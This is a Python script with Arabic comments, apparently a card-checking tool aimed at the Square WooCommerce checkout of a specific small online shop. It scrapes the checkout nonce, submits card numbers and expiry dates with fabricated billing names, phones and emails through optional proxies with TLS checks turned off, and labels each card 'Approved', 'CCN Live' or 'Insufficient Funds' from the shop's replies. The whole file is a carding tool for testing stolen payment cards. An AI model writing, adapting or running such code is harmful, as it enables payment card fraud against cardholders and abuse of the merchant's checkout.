"""
بوابة الدفع: Square Auth Single
الموقع: www.nancynixrice.com
نوع البوابة: Square Auth Single (WooCommerce Square - Checkout Flow)
تدفق الطلبات:
1. GET /checkout/ -> استخراج woocommerce-process-checkout-nonce
2. POST /?wc-ajax=checkout -> إرسال بيانات البطاقة والحصول على النتيجة
"""
import aiohttp
import asyncio
import uuid
import ssl
import re
from cookies_loader import load_cookies, get_cookies_path


async def req1_get_checkout_nonce(
    session: aiohttp.ClientSession,
    proxy_url: str = None,
) -> str:
    """الخطوة 1: جلب woocommerce-process-checkout-nonce من صفحة الدفع."""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }
    try:
        async with session.get(
            "https://www.nancynixrice.com/checkout/",
            headers=headers,
            proxy=proxy_url,
        ) as r:
            text = await r.text()
        nonce_match = re.search(
            r'name="woocommerce-process-checkout-nonce" value="([^"]+)"', text
        )
        return nonce_match.group(1) if nonce_match else ""
    except Exception as e:
        raise RuntimeError(f"req1_get_checkout_nonce failed: {e}") from e


async def req2_submit_checkout(
    session: aiohttp.ClientSession,
    checkout_nonce: str,
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 2: إرسال طلب الـ Auth عبر WooCommerce checkout."""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Referer": "https://www.nancynixrice.com/checkout/",
        "X-Requested-With": "XMLHttpRequest",
    }
    payload = {
        "billing_first_name": "James",
        "billing_last_name": "Smith",
        "billing_company": "",
        "billing_country": "US",
        "billing_address_1": "102 High St",
        "billing_address_2": "",
        "billing_city": "Boston",
        "billing_state": "MA",
        "billing_postcode": "02129",
        "billing_phone": "617" + str(uuid.uuid4().int)[:7],
        "billing_email": "smith" + str(uuid.uuid4().int)[:5] + "@gmail.com",
        "order_comments": "",
        "payment_method": "square_credit_card",
        "woocommerce-process-checkout-nonce": checkout_nonce,
        "_wp_http_referer": "/checkout/",
        "wc-square-credit-card-card-nonce": "cnon:card-nonce-ok",
        "wc-square-credit-card-last-four": cc[-4:],
        "wc-square-credit-card-expiry-month": mes,
        "wc-square-credit-card-expiry-year": ano,
        "wc-square-credit-card-card-type": "visa",
    }
    try:
        async with session.post(
            "https://www.nancynixrice.com/?wc-ajax=checkout",
            headers=headers,
            data=payload,
            proxy=proxy_url,
        ) as r:
            try:
                response_data = await r.json(content_type=None)
                return str(response_data)
            except Exception:
                return await r.text()
    except Exception as e:
        raise RuntimeError(f"req2_submit_checkout failed: {e}") from e


async def process_SQ_single(
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الدالة الرئيسية لفحص البطاقة عبر بوابة Square Auth Single."""
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_ctx)
    timeout = aiohttp.ClientTimeout(total=20)
    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            try:
                cookies = load_cookies(get_cookies_path("SQ-2-Cookies.txt"))
                session.cookie_jar.update_cookies(cookies)
            except Exception:
                pass
            checkout_nonce = await req1_get_checkout_nonce(session, proxy_url)
            response_text = await req2_submit_checkout(session, checkout_nonce, cc, mes, ano, cvv, proxy_url)
    except Exception as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", f"Error: {e}"
    if any(x in response_text for x in ["success", "thank-you", "order-received"]):
        return f"✅ | {cc}|{mes}|{ano}|{cvv}", "Approved"
    elif any(x in response_text for x in ["insufficient_funds", "card_declined_insufficient_funds", "Insufficient Funds"]):
        return f"✅ | {cc}|{mes}|{ano}|{cvv}", "Insufficient Funds"
    elif any(x in response_text for x in ["security code is incorrect", "incorrect_cvc", "CVV"]):
        return f"✅ | {cc}|{mes}|{ano}|{cvv}", "CCN Live"
    elif any(x in response_text for x in ["card was declined", "declined", "card_declined"]):
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", "Declined"
    elif "expired" in response_text.lower():
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", "Expired Card"
    else:
        error_match = re.search(r"<li>(.*?)</li>", response_text)
        if error_match:
            return f"❌ | {cc}|{mes}|{ano}|{cvv}", error_match.group(1)
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", "Declined / Error"
